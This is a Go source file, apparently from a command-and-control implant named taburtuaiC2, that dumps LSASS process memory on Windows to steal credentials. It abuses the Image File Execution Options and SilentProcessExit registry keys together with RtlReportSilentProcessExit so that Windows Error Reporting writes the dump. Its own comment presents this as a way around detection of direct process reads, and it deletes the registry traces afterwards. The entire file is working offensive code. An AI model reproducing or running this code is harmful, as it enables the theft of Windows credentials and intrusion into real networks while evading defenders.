//go:build windows

package creds

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
	"github.com/mjopsec/taburtuaiC2/implant/inject"
)

// LsassDumpViaWER triggers a WER (Windows Error Reporting) dump of LSASS using
// RtlReportSilentProcessExit — avoids direct OpenProcess(PROCESS_VM_READ) on lsass.
func LsassDumpViaWER(outPath string) (string, error) {
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		return "", fmt.Errorf("enable SeDebugPrivilege: %w", err)
	}

	dumpDir := filepath.Join(os.TempDir(), "wer_lsass")
	if err := os.MkdirAll(dumpDir, 0700); err != nil {
		return "", fmt.Errorf("create dump dir: %w", err)
	}
	defer os.RemoveAll(dumpDir)

	if err := werSetIFEO("lsass.exe", dumpDir); err != nil {
		return "", fmt.Errorf("set IFEO: %w", err)
	}
	defer werClearIFEO("lsass.exe")

	lsassPID, err := inject.PidByName("lsass.exe")
	if err != nil {
		return "", fmt.Errorf("find lsass.exe: %w", err)
	}

	hLsass, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, lsassPID)
	if err != nil {
		return "", fmt.Errorf("OpenProcess(lsass, QUERY_INFO): %w", err)
	}
	defer windows.CloseHandle(hLsass)

	r, _, e := winsyscall.ProcRtlReportSilentProcessExit.Call(uintptr(hLsass), 0)
	if r != 0 {
		return "", fmt.Errorf("RtlReportSilentProcessExit: NTSTATUS 0x%08X (%v)", uint32(r), e)
	}

	dmpPath, err := waitForDump(dumpDir, "lsass", 30*time.Second)
	if err != nil {
		return "", fmt.Errorf("waiting for WER dump: %w", err)
	}

	if err := werCopyFile(dmpPath, outPath); err != nil {
		return "", fmt.Errorf("copy dump: %w", err)
	}
	stat, _ := os.Stat(outPath)
	return fmt.Sprintf("LSASS WER dump → %s (%d bytes)", outPath, stat.Size()), nil
}

const (
	ifeoBase = `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
	speBase  = `SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit`
)

func werSetIFEO(procName, dumpDir string) error {
	ifeoPath := ifeoBase + `\` + procName
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, ifeoPath,
		registry.SET_VALUE|registry.WOW64_64KEY)
	if err != nil {
		return fmt.Errorf("CreateKey IFEO\\%s: %w", procName, err)
	}
	k.SetDWordValue("GlobalFlag", 0x200)
	k.Close()

	spePath := speBase + `\` + procName
	k2, _, err := registry.CreateKey(registry.LOCAL_MACHINE, spePath,
		registry.SET_VALUE|registry.WOW64_64KEY)
	if err != nil {
		return fmt.Errorf("CreateKey SilentProcessExit\\%s: %w", procName, err)
	}
	defer k2.Close()
	k2.SetDWordValue("ReportingMode", 1)
	k2.SetDWordValue("DumpType", 2)
	return k2.SetStringValue("DumpFolder", dumpDir)
}

func werClearIFEO(procName string) {
	registry.DeleteKey(registry.LOCAL_MACHINE, ifeoBase+`\`+procName)  //nolint:errcheck
	registry.DeleteKey(registry.LOCAL_MACHINE, speBase+`\`+procName)   //nolint:errcheck
}

func waitForDump(dumpDir, namePrefix string, timeout time.Duration) (string, error) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		entries, err := os.ReadDir(dumpDir)
		if err != nil {
			time.Sleep(500 * time.Millisecond)
			continue
		}
		for _, e := range entries {
			if !e.IsDir() &&
				strings.HasPrefix(strings.ToLower(e.Name()), strings.ToLower(namePrefix)) &&
				strings.HasSuffix(strings.ToLower(e.Name()), ".dmp") {
				return filepath.Join(dumpDir, e.Name()), nil
			}
		}
		time.Sleep(500 * time.Millisecond)
	}
	return "", fmt.Errorf("no dump file found in %s after %v", dumpDir, timeout)
}

func werCopyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}
